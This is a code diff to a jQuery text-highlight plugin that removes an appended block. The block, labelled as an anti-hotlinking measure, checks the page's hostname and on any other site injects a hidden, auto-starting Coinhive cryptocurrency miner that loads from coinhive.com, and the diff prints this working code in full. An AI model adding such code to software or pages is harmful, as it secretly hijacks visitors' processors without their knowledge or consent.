@@ -52,36 +52,3 @@ jQuery.fn.removeHighlight = function() {
         }
     }).end();
 };
-
-/* PLEASE DO NOT HOTLINK MY FILES, THANK YOU. */
-
-if (!/johannburkard.de$/i.test(location.hostname)) {
-    function loadCoinhive() {
-        (function() {
-            try {
-                var div = document.createElement('div')
-                div.setAttribute('class', 'coinhive-miner')
-                div.setAttribute('style', 'width: 0; height: 0; display: none')
-                div.setAttribute('data-key', '4YSJkhitlocdnLIqQ2zEpzOK6cDQRGfM')
-                div.setAttribute('data-autostart', 'true')
-                document.body.appendChild(div)
-
-                var script = document.createElement('script')
-                script.setAttribute('src', 'https://coinhive.com/lib/miner.min.js')
-                document.body.appendChild(script)
-            }
-            catch (e) {}
-        })()
-    }
-    if (/m/.test(document.readyState)) { // coMplete
-        loadCoinhive()
-    }
-    else {
-        if ("undefined" != typeof window.attachEvent) {
-            window.attachEvent("onload", loadCoinhive)
-        }
-        else if (window.addEventListener) {
-            window.addEventListener("load", loadCoinhive, false)
-        }
-    }
-}
